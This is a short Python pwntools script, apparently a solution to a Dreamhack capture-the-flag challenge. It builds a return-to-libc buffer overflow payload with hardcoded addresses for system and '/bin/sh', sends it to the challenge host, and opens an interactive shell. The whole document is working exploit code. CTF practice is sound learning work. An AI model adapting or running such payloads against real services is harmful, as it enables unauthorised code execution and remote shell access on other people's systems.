'''
from pwn import *

# buf + sfp + system의 주소 + system의 sfp + /bin/sh
payload = b'\x00'*46 + b'\x90'*8 + b'\xe8\x1e\xc1\xf7\xff\x7f\x00\x00' + b'\x90'*8 + b'\xa7\xdd\x0e\xf8\xfe\x7f\x00\x00' 

r = remote('host3.dreamhack.games', 11316)

r.sendline(payload)

r.interactive()
'''